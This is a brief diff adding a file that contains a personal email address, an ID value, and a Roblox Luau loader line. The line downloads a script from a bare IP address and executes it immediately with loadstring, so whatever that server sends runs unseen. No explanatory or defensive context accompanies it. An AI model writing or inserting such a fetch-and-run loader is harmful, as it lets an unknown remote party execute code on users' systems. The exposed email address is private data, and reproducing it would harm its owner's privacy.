@@ -1,0 +1,4 @@
+angelsolerguanipa@gmail.com
+
+ID="51c10fda-4d14-48d9-9fe8-f0fe34a1166f";
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()```
